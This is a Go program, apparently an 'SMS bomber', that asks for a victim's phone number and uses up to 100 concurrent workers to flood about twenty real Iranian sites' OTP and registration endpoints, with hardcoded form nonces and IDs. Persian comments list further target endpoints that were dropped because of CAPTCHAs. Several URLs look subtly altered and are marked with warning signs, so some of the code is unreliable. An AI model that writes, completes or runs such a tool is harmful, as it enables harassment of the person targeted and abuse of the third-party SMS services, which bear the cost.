// faghat teste code


package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() 

	const maxRetries = 3          
	const retryDelay = 2 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): 
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3           
	const retryDelay = 3 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): 
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 

	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 100 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 30 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 30 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	tasks := make(chan func(), repeatCount*40)


	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {

		// okala.com - OTPRegister (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://apigateway.ok.ala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
				"mobile":                     phone,
				"confirmTerms":               true,
				"notRobot":                   false,
				"ValidationCodeCreateReason": 5,
				"OtpApp":                     0,
				"IsAppOnly":                  false,
				"deviceTypeCode":             7,
				// سایر فیلدهای موجود در Payload اصلی را می‌توانید اینجا اضافه کنید اگر نیاز باشد
			}, &wg, ch)//⚠️
		}

		// okala.com - SaveUserInfo (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: UserAttributes یک آرایه پیچیده است. فرض بر این است که این ساختار ثابت است
			// و فقط شماره تلفن در آن داینامیک می‌شود.
			// اگر این ساختار نیاز به تولید داینامیک یا اطلاعات دیگر دارد، ممکن است نیاز به تغییرات بیشتری باشد.
			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/SaveUserInfo", map[string]interface{}{
				"mobileNumber": phone,
				"UserAttributes": []map[string]interface{}{
					{"key": "phone", "value": phone},
					{"key": "user_id", "value": nil},
					// سایر المان‌های آرایه UserAttributes را در صورت نیاز اضافه کنید
				},
				"userMetrixId": "5fdc65ee-966f-4712-9a68-73381054398f", // این مقدار ممکن است داینامیک باشد و نیاز به بررسی دارد
			}, &wg, ch)
		}

		// livarfars.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("digits_process_register", "1")
			formData.Set("instance_id", "9db186c8061abadc35d6b9563c5e0f33") // این مقدار ممکن است داینامیک باشد و نیاز به بررسی دارد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//livarfars.ir/?page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "58b9067254")                                                                // این مقدار ممکن است داینامیک باشد و نیاز به بررسی دارد
			formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// bigtoys.ir - Variation 1 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action_type", "phone")
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("email", "")
			formData.Set("digits_reg_name", "abcdefghl")
			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			formData.Set("digits_process_register", "1")
			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/")
			sendFormRequest(ctx, "https://www.big.toys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}//⚠️

		// bigtoys.ir - Variation 2 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action_type", "phone")
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("email", "")
			formData.Set("digits_reg_name", "abcdefghl")
			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			formData.Set("digits_process_register", "1")
			formData.Set("optional_email", "")
			formData.Set("is_digits_optional_data", "1")
			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "email")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/")
			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// bigtoys.ir - Variation 3 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action_type", "phone")
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("email", "")
			formData.Set("digits_reg_name", "abcdefghl")
			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			formData.Set("digits_process_register", "1")
			formData.Set("optional_email", "")
			formData.Set("is_digits_optional_data", "1")
			formData.Set("sms_otp", "")
			formData.Set("otp_step_1", "1")
			formData.Set("signup_otp_mode", "1")
			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "email")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/")
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// ashraafi.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "send_verification_code")
			formData.Set("phone_number", phone)
			sendFormRequest(ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// moshaveran724.ir - pms.php (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone)
			formData.Set("cache", "false")
			sendFormRequest(ctx, "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
		}

		// moshaveran724.ir - uservalidate.php (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("number", phone)
			formData.Set("cache", "false")
			sendFormRequest(ctx, "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
		}

		// simkhanapi.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "key" در این درخواست وجود دارد و ممکن است داینامیک باشد.
			// اگر این key ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت key جدید در هر بار دارد.
			sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
				"mobileNumber": phone,
				"key":          "036040d8-452e-48f9-b544-d2ffd1442132", // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
				"ReSendSMS":    false,
			}, &wg, ch)
		}

		// pakhsh.shop - Variation 1 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("digits_reg_name", "ifiyfxgud")
			formData.Set("digits_process_register", "1")
			formData.Set("instance_id", "7b9c803771fd7a82bf8f0f5a673f1a3d") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "63fd8a495f")                                                                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// pakhsh.shop - Variation 2 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("digits_reg_name", "ifiyfxgud")
			formData.Set("digits_process_register", "1")
			formData.Set("sms_otp", "")
			formData.Set("otp_step_1", "1")
			formData.Set("signup_otp_mode", "1")
			formData.Set("instance_id", "7b9c803771fd7a82bf8f0f5a673f1a3d") // این مقدار ممکن است داینامیک باشد
			formData.Set("optional_data", "optional_data")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F") // ممکن است نیاز به URL Encode داشته باشد
			formData.Set("digits_form", "63fd8a495f")                                                                // این مقدار ممکن است داینامیک باشد
			formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F")       // ممکن است نیاز به URL Encode داشته باشد و داینامیک باشد
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// api.doctoreto.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: فیلد "captcha" در Payload وجود دارد، حتی اگر خالی باشد.
			// برخی سایت ها ممکن است این فیلد را بررسی کنند یا در آینده CAPTCHA واقعی اضافه کنند.
			sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
				"mobile":     strings.TrimPrefix(phone, "0"), // این سایت ممکن است شماره را بدون صفر اول بخواهد
				"country_id": 205,
				"captcha":    "", // ممکن است در آینده نیاز به CAPTCHA واقعی پیدا کند
			}, &wg, ch)
		}

		// platform-api.snapptrip.com - inquiry (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/inquiry", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// platform-api.snapptrip.com - request-otp (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// backend.digify.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// api.watchonline.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// offch.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("1_invite_code", "")
			formData.Set("1_username", phone) // نام فیلد شماره تلفن در اینجا 1_username است
			// formData.Set("0", `[{"message":""},"$K1"]`) // این فیلد به نظر ثابت و مرتبط با پیام است و شاید نیازی به ارسال نداشته باشد
			sendFormRequest(ctx, "https://www.offch.com/login", formData, &wg, ch)
		}

		// mamifood.org - IsUserAvailable (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}

		// mamifood.org - SendValidationCode (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "did" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Device ID).
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت did جدید در هر بار دارد.
			sendJSONRequest(ctx, "https://mami.food.org/Registration.aspx/SendValidationCode", map[string]interface{}{
				"Phone": phone,
				"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791", // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			}, &wg, ch)//⚠️
		}

		// refahtea.ir (Form)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "security" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Nonce یا Token).
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت security جدید در هر بار دارد.
			formData := url.Values{}
			formData.Set("action", "refah_send_code")
			formData.Set("mobile", strings.TrimPrefix(phone, "0")) // ممکن است شماره را بدون صفر اول بخواهد
			formData.Set("security", "e10382e5bd")                 // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// glite.ir (Form)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "security" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Nonce یا Token).
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت security جدید در هر بار دارد.
			formData := url.Values{}
			formData.Set("action", "mreeir_send_sms")
			formData.Set("mobileemail", phone) // نام فیلد شماره تلفن در اینجا mobileemail است
			formData.Set("userisnotauser", "")
			formData.Set("type", "mobile")
			formData.Set("captcha", "")     // ممکن است در آینده نیاز به CAPTCHA داشته باشد
			formData.Set("captchahash", "") // ممکن است در آینده نیاز به CAPTCHA داشته باشد
			formData.Set("security", "b9de62da42") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}


		// --- URLهایی که ممکن است مشکل داشته باشند ---

		// okala.com - CheckHasPassword
		// Request URL: https://apigateway.okala.com/api/voyager/C/CustomerAccount/CheckHasPassword?mobile=09123456456
		// Request Method: POST
		// توجه: این URL یک درخواست POST است اما شماره تلفن در Query String (بعد از علامت ?) ارسال شده است.
		// توابع sendJSONRequest و sendFormRequest برای ارسال داده در بدنه درخواست طراحی شده‌اند.
		// برای این URL خاص، یا باید تابع جدیدی بنویسید که POST با پارامتر در URL ارسال کند، یا آن را نادیده بگیرید.
		// در حال حاضر به کدهای شما اضافه نشده است.

		// bitex24.com
		// Request URL: https://bitex24.com/api/v1/auth/sendSms2
		// Request Method: POST
		// Payload: {"mobile": "...", "countryCode": {...}, "captcha": "..."}
		// توجه: این وب‌سرویس فیلد CAPTCHA دارد که نیاز به پاسخ داینامیک دارد.
		// کد فعلی شما CAPTCHA را حل نمی‌کند، بنابراین این درخواست به احتمال زیاد به دلیل CAPTCHA ناموفق خواهد بود.
		// همچنین شامل اطلاعات Country Code است که باید دقیق باشد.
		// در حال حاضر به کدهای شما اضافه نشده است زیرا نیاز به حل CAPTCHA دارد.

		// bazidone.com و behzadshami.com و tagmond.com و chamedoun.com و gateway.wisgoon.com
		// این وب‌سرویس‌ها همگی نیاز به CAPTCHA (مانند g-recaptcha-response یا recaptchaToken) دارند.
		// کد فعلی شما قابلیت حل CAPTCHA را ندارد، بنابراین درخواست‌ها به احتمال زیاد به دلیل CAPTCHA ناموفق خواهند بود.
		// برخی از آنها شامل پارامترهای دیگری مانند instance_id یا nonce نیز هستند که ممکن است نیاز به تولید داینامیک داشته باشند.
		// به دلیل نیاز به CAPTCHA، این URLها به کدهای شما اضافه نشده‌اند.

		// mihanpezeshk.com (ConfirmCodeSbm_Doctor و Verification_Patients)
		// Request URL: https://www.mihanpezeshk.com/ConfirmCodeSbm_Doctor و https://www.mihanpezeshk.com/Verification_Patients
		// Request Method: POST
		// Form Data: mobile=...&_token=...&recaptcha=...
		// توجه: این وب‌سرویس‌ها شامل پارامتر "_token" هستند که به احتمال زیاد یک توکن امنیتی داینامیک است.
		// همچنین شامل فیلد recaptcha هستند که حتی اگر خالی باشد ممکن است بررسی شود.
		// اگر "_token" داینامیک باشد، باید قبل از هر درخواست یک توکن جدید دریافت و استفاده کنید که کد فعلی این قابلیت را ندارد.
		// در حال حاضر به کدهای شما اضافه نشده‌اند زیرا نیاز به مدیریت توکن و احتمالا CAPTCHA دارند.

		// api.bitpin.org
		// Request URL: https://api.bitpin.org/v3/usr/authenticate/
		// Request Method: POST
		// Payload: {"device_type": "web", "password": "...", "phone": "..."}
		// توجه: این وب‌سرویس برای احراز هویت است و نیاز به "password" دارد، نه ارسال OTP.
		// استفاده از این URL برای SMS Bomber مناسب نیست و نیاز به رمز عبور (که داینامیک نیست و مربوط به حساب کاربری است) دارد.
		// به کدهای شما اضافه نشده است.

		// auth.mrbilit.ir
		// Request URL: https://auth.mrbilit.ir/api/Token/send?mobile=09123456789
		// Request Method: GET
		// توجه: این URL یک درخواست GET است. توابع sendJSONRequest و sendFormRequest فقط برای درخواست‌های POST طراحی شده‌اند.
		// برای این URL، نیاز به نوشتن یک تابع جدید برای ارسال درخواست GET دارید.
		// در حال حاضر به کدهای شما اضافه نشده است زیرا نیاز به تابع جدیدی برای GET دارد.

		// core.gap.im
		// Request URL: https://core.gap.im/v1/user/sendOTP.gap
		// Request Method: POST
		// Body: Þ¦mobile­+989123456789
		// توجه: فرمت بدنه درخواست در این URL استاندارد JSON یا Form Data نیست و به نظر می‌رسد فرمت باینری یا سفارشی دارد.
		// توابع sendJSONRequest و sendFormRequest قابلیت ارسال این نوع بدنه را ندارند.
		// برای این URL، نیاز به بررسی دقیق فرمت بدنه و نوشتن کد سفارشی برای ساخت و ارسال آن دارید.
		// در حال حاضر به کدهای شما اضافه نشده است زیرا فرمت بدنه نامعمول دارد.

	}

	// ... (بقیه کدهای main تابع بدون تغییر) ...
	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
